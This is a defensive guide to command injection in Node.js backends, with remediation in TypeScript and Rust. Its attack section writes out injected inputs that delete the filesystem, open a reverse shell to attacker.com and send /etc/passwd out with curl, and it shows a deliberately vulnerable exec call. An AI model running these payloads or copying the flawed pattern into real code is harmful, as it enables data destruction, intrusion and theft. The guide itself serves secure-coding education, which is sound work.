# Command Injection Attack

## 📋 Attack Information
**Category**: Backend Attack | **Severity**: 🔴 High (CVSS 9.0) | **CWE**: CWE-78

## 🎯 Attack Principle
Attacker injects shell commands through user input, executing arbitrary commands on server.

## 💀 Attack Examples

### Basic Command Injection
```javascript
// ❌ DANGEROUS
const filename = req.body.filename;
exec(`cat ${filename}`, (error, stdout) => {
  res.send(stdout);
});

// Attack input: "file.txt; rm -rf /"
// Executes: cat file.txt; rm -rf /
// → Deletes entire system!
```

### Reverse Shell
```bash
# Attack input:
filename: "file.txt; bash -i >& /dev/tcp/attacker.com/4444 0>&1"

# Gives attacker remote shell access
```

### Data Exfiltration
```bash
# Attack input:
filename: "file.txt; curl https://attacker.com/steal --data @/etc/passwd"

# Uploads sensitive files to attacker
```

## 🛡️ Defense Measures

### 1. Never Use exec/system with User Input
```typescript
// ❌ NEVER DO THIS
const { exec } = require('child_process');
exec(`command ${userInput}`); // DANGEROUS!

// ✅ Use safer alternatives
import fs from 'fs/promises';

// Read file safely
const content = await fs.readFile(filename, 'utf8');
```

### 2. Input Validation (If Command Necessary)
```typescript
/**
 * Strict input validation
 */
function validateFilename(filename: string): boolean {
  // Only allow alphanumeric, dots, dashes
  const safePattern = /^[a-zA-Z0-9._-]+$/;
  
  if (!safePattern.test(filename)) {
    throw new Error('Invalid filename');
  }
  
  // No path traversal
  if (filename.includes('..') || filename.includes('/')) {
    throw new Error('Invalid filename');
  }
  
  // Length limit
  if (filename.length > 255) {
    throw new Error('Filename too long');
  }
  
  return true;
}
```

### 3. Use exec with Array Arguments
```typescript
// ✅ Safer: Arguments as array (no shell interpretation)
import { spawn } from 'child_process';

function executeCommand(args: string[]) {
  return new Promise((resolve, reject) => {
    const process = spawn('command', args, {
      shell: false, // ✅ Don't use shell
    });
    
    let output = '';
    process.stdout.on('data', (data) => {
      output += data;
    });
    
    process.on('close', (code) => {
      if (code === 0) {
        resolve(output);
      } else {
        reject(new Error('Command failed'));
      }
    });
  });
}

// Usage
await executeCommand([validatedArg1, validatedArg2]);
```

### 4. Rust Backend (Type-Safe)
```rust
// ✅ Rust std::process with safe arguments
use std::process::Command;

fn execute_command(filename: &str) -> Result<String, Error> {
    // Validate filename
    validate_filename(filename)?;
    
    // Execute with separate arguments (no shell)
    let output = Command::new("cat")
        .arg(filename) // Safe - treated as literal argument
        .output()?;
    
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}
```

### 5. Principle of Least Privilege
```bash
# ✅ Run application with limited user
# Create non-privileged user
sudo useradd -r -s /bin/false walletapp

# Run app as this user (can't access system files)
sudo -u walletapp node server.js

# If command injection occurs, damage limited
```

### 6. Disable Dangerous Functions
```javascript
// ✅ In production, disable eval, exec
if (process.env.NODE_ENV === 'production') {
  global.eval = undefined;
  global.Function = undefined;
}
```

## ✅ Best Practices

```
Prevention:
□ Never pass user input to exec/system/eval
□ Use native libraries instead of shell commands
□ If must use commands, use spawn with shell:false
□ Validate inputs with strict whitelist
□ Use parameterized arguments

Mitigation:
□ Run app with least privilege
□ Use containers/sandboxes
□ Disable unnecessary shell commands
□ Monitor process execution
□ Implement command whitelisting

Rust Alternative:
□ Use Rust backend for system operations
□ Type safety prevents many injection vectors
□ No implicit shell interpretation
```

**Created**: November 11, 2025

